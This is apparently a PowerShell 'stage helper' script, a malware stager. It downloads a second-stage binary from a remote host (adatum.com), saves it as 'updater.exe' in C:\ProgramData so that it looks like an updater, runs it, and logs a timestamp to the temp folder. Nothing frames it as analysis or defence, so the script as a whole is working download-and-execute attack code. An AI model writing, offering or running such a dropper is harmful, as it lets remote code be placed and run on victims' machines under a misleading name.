# Stage helper
$DownloadUrl = "http://adatum.com/stage2.bin"
$Stage2Path = 'C:\ProgramData\updater.exe'
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $Stage2Path)
Start-Process -FilePath $Stage2Path
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
